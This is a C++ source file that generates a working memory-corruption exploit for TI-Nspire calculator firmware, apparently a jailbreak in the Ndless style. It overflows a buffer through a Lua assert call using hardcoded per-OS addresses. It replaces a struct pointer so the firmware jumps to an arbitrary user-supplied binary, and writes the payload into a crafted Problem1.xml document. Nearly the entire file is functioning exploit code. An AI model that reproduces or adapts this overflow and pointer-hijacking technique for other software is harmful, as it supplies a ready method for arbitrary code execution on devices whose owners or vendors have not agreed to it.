#include <cstdint>
#include <algorithm>
#include <functional>
#include <iostream>
#include <iterator>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>

enum OS : int {
	NCAS = 0,
	CAS,
	CX,
	CXCAS
};

// Address where the created buffer will be loaded at
static uint32_t overflow_addr[4] = { 0x10EBB612, 0x10E8F60A, 0x1110D752, 0x1116D752 };
// Address of a pointer to the struct we want to replace
static const uint32_t struct_ptr[4] = { 0x10F7B5B4, 0x10F4F5AC, 0x111CD6F4, 0x1122D6F4 };
// Where the binary (argv[1]) will be put in the buffer (chosen manually, because of unsafe locations)
static const uint32_t loc_code[4] = { 0x10F7A084, 0x10F4EF04, 0x111CCF84, 0x1122CD84 };
// The struct itself
static uint32_t orig_struct[][32] = {
{
0x1147A8B4,
0x1147A944,
0x1147AA5C,
0x1147B648,
0x1147B0B4,
0x1147BBDC,
0x1147BCB0,
0x1147BD84,
0x1147BF24,
0x00000001,
0x1009BDC8,
0x00008001,
0x1147C0C4,
0x1147A9CC,
0x1147A8E8,
0x1147A85C,
0x00000000,
0x10F7B810,
0x00000000,
0x1147A85C,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000
},
{
0x114424FC,
0x11442294,
0x114426A4,
0x11443290,
0x11442CFC,
0x11443824,
0x114438F8,
0x114439CC,
0x11443B6C,
0x00000001,
0x1009B838,
0x00008001,
0x11443D0C,
0x11442614,
0x11442530,
0x114424A4,
0x00000000,
0x10F4F808,
0x00000000,
0x11442540,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x1144257C,
},
{
0x11767E90,
0x117E7F08,
0x11767FE0,
0x11768BA4,
0x11768638,
0x11769110,
0x117691B4,
0x11769258,
0x117693E0,
0x00000001,
0x1009B3DC,
0x00008001,
0x11769568,
0x11767F68,
0x11767EAC,
0x11767E38,
0x00000000,
0x1122D99C,
0x00000000,
0x11767EBC,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x11767EF8,
0x11767E80,
0x00000000,
0x1122D99C,
0x11767BC0,
0x11767F94,
0x00000000
},
{
0x11767E90,
0x117E7F08,
0x11767FE0,
0x11768BA4,
0x11768638,
0x11769110,
0x117691B4,
0x11769258,
0x117693E0,
0x00000001,
0x1009AE7C,
0x00008001,
0x11769568,
0x11767F68,
0x11767EAC,
0x11767E38,
0x00000000,
0x1122D99C,
0x00000000,
0x11767EBC,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x00000000,
0x11767EF8,
0x11767E80,
0x00000000,
0x1122D99C,
0x11767BC0,
0x11767F94,
0x00000000
}};

std::string luaForOS(OS os, std::string installer_filename)
{
  	//Build the buffer content
	std::ifstream installer_bin(installer_filename, std::ios::binary);

	std::vector<uint8_t> toplevel_pad(4 - (overflow_addr[os] & 3));
	overflow_addr[os] = (overflow_addr[os] + 4) & ~3;

	//Padding for the installer
	std::vector<uint8_t> buffer_content(loc_code[os] - overflow_addr[os]);

	buffer_content.insert(buffer_content.end(), std::istreambuf_iterator<char>{installer_bin}, std::istreambuf_iterator<char>{});

	//4-byte alignment
	buffer_content.resize((buffer_content.size() + 4) & ~3);

	uint32_t newstruct_addr = buffer_content.size() + overflow_addr[os];
	orig_struct[os][10] = loc_code[os];

	//Copy patched struct into the buffer	
	std::vector<uint8_t> patched_struct(reinterpret_cast<uint8_t*>(orig_struct[os]), reinterpret_cast<uint8_t*>(orig_struct[os] + sizeof(orig_struct[os])));
	buffer_content.insert(buffer_content.end(), patched_struct.begin(), patched_struct.end());

	//And write the address of the patched struct at the correct position
	uint32_t ptr_pos = struct_ptr[os] - overflow_addr[os];

	if(ptr_pos < buffer_content.size())
	{
		std::cerr << "Binary too large (Binary ends at 0x" << std::hex << buffer_content.size() + overflow_addr[os] << ", but the struct ptr is at 0x" << std::hex << struct_ptr[os]  << "!" << std::endl;
		return "";
	}

	buffer_content.resize(ptr_pos);
	buffer_content.push_back(newstruct_addr);
	buffer_content.push_back(newstruct_addr >> 8);
	buffer_content.push_back(newstruct_addr >> 16);
	buffer_content.push_back(newstruct_addr >> 24);

	buffer_content.insert(buffer_content.begin(), toplevel_pad.begin(), toplevel_pad.end());

	//The buffer mustn't contain any 0s
	std::replace(buffer_content.begin(), buffer_content.end(), 0, 1);

	std::cout << "Size of buffer (OS " << os << "): 0x" << std::hex << buffer_content.size() << std::endl;

	//Now generate a lua formatted string
	std::ostringstream ss(std::ios_base::ate);
	std::ostringstream line(std::ios_base::ate);
	line.str("s = s..\"");

	auto i = buffer_content.begin();
	while(i != buffer_content.end())
	{
		auto j = std::adjacent_find(i, buffer_content.end(), std::not_equal_to<uint8_t>());
		int count = std::distance(i, j) + (j == buffer_content.end() ? 0 : 1);

		if(count < 20000)
			count = 1;

		if(count == 1)
			line << "\\" << (int)*i;
		else
		{
			ss << line.str() << "\"" << std::endl;
			line.str("s = s..string.rep(\"\\"); line << (int)*i << "\", " << count << ")..\"";
		}

		if(line.tellp() >= 15000000 || i + count == buffer_content.end())
		{
			ss << line.str() << "\"" << std::endl;
			line.str("s = s..\"");
		}

		i += count;
	}
	
	return ss.str();
}

int main(int argc, char **argv)
{
	if(argc != 3)
	{
		std::cout << "Usage: installer.bin Problem1.xml" << std::endl;
		return 1;
	}

	//Write LUA
	std::ostringstream lua;

	lua 	<< "on = {}" << std::endl
		<< "local _, caserr = math.eval(\"solve()\")" << std::endl
		<< "cas = caserr == 930" << std::endl
		<< "function on.restore()" << std::endl
		<< "s = \"\"" << std::endl
		<< "local cx = platform.isColorDisplay()" << std::endl
		<< "if not cas and not cx then" << std::endl
		<< luaForOS(OS::NCAS, argv[1])
		<< "elseif cas and not cx then" << std::endl
		<< luaForOS(OS::CAS, argv[1])
		<< "elseif not cas and cx then" << std::endl
		<< luaForOS(OS::CX, argv[1])
		<< "else" << std::endl
		<< luaForOS(OS::CXCAS, argv[1])
		<< "end" << std::endl
		<< "tiassert.assert(false, 0, s)" << std::endl
		<< "end" << std::endl
		<< "return {QuestionProperties={prompt=\"\"}, DropZone={vScreen={}}}" << std::endl;

	//XML-Escape LUA
	std::string lua_escaped = lua.str();
	size_t pos = 0;
	while((pos = lua_escaped.find("\"", pos)) != std::string::npos)
	{
		lua_escaped.replace(pos, 1, "&quot;");
		pos += 5;
	}

	//Write XML
	std::ofstream output(argv[2]);
	
	output << "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>" << std::endl
		<< "<prob xmlns=\"urn:TI.Problem\" ver=\"1.0\" pbname=\"\">" << std::endl
		<< "<sym></sym><card clay=\"0\" h1=\"10000\" h2=\"10000\" w1=\"10000\" w2=\"10000\"><isDummyCard>0</isDummyCard>" << std::endl
		<< "<flag>0</flag><wdgt xmlns:sc=\"urn:TI.ScriptApp\" type=\"TI.ScriptApp\" ver=\"1.0\">" << std::endl
		<< "<sc:mFlags>1024</sc:mFlags><sc:value>0</sc:value><sc:script version=\"512\" id=\"3\"></sc:script>" << std::endl
		<< "<sc:state>" << std::endl
		<< lua_escaped << std::endl
		<< "</sc:state><sc:scriptTitle></sc:scriptTitle></wdgt></card></prob>" << std::endl;

	return 0;
}
